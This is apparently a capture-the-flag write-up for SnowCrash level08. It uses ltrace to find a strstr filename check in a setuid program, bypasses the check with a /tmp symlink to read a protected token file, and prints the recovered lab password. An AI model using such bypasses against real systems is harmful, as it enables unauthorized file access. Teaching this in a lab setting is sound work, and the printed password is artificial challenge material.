# Find the Flag08 Password

When we log in as `level08`, we can see the `level08` executable and a `token` file in the home directory.

Run the executable first:

```sh
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ cat token
cat: token: Permission denied
```

The `token` file cannot be read directly with `cat`, and `level08` also refuses to read it when the filename is `token`.

Use `ltrace` to inspect the library calls made by the program:

```sh
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                     = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                 = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

The important line is:

```text
strstr("token", "token") = "token"
```

`strstr()` searches for the second string inside the first string. Here, it finds `"token"` in the filename we passed to the program. After that, the program prints the error message and exits.

This suggests that the program blocks access based on the filename string, not only based on file permissions.

Changing the file permissions does not work:

```sh
level08@SnowCrash:~$ chmod 777 token
chmod: changing permissions of `token': Operation not permitted
```

We do not own the file, so we cannot change its permissions.

## Bypass the Filename Check

The program rejects paths containing the string `token`. We can bypass this check by creating a symbolic link whose name does not contain `token`, while still pointing to the real file:

```sh
level08@SnowCrash:~$ ln -s $(realpath token) /tmp/symlink
```

Now pass the symbolic link to the executable:

```sh
level08@SnowCrash:~$ ./level08 /tmp/symlink
quif5eloekouj29ke0vouxean
```

The path `/tmp/symlink` does not contain the blocked string, so the filename check passes. The symlink still resolves to the original `token` file, allowing `level08` to read it.

Use the printed password to log in as `flag08`, then run `getflag` to get the token for the next level.
